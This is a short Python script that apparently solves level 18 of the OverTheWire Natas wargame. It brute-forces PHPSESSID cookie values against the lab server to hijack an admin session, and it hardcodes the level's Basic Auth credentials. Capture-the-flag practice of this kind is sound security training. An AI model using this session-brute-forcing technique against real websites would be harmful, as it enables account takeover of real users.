import requests
import time

auth_header = {
    'Authorization': 'Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==',
}

url = 'http://natas18.natas.labs.overthewire.org'

for i in range(1, 641):
    print("Trying number %d" % i)
    cookie = {"PHPSESSID": str(i)}
    resp = requests.request(method='POST', url=url, headers=auth_header, cookies=cookie)
    time.sleep(0.1)
    if "You are an admin." in resp.text:
        print(resp.text)
        break
